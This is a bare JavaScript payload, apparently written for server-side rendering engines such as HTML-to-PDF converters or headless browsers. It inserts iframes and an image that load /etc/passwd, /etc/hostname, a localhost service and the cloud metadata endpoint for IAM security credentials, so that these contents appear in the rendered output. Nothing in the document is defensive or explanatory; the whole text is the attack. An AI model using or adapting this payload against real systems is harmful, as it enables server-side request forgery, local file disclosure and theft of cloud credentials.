
var f1 = document.createElement('iframe');
f1.src = 'file:///etc/passwd';
f1.width = '800';
f1.height = '400';
document.body.appendChild(f1);

var f2 = document.createElement('iframe');
f2.src = 'http://localhost:8080/';
f2.width = '800';
f2.height = '300';
document.body.appendChild(f2);

var f3 = document.createElement('iframe');
f3.src = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
f3.width = '800';
f3.height = '200';
document.body.appendChild(f3);

var im = document.createElement('img');
im.src = 'file:///etc/hostname';
im.width = '1';
im.height = '1';
document.body.appendChild(im);

var i = document.createElement('div');
i.src = 'hey there';
document.body.appendChild(i);

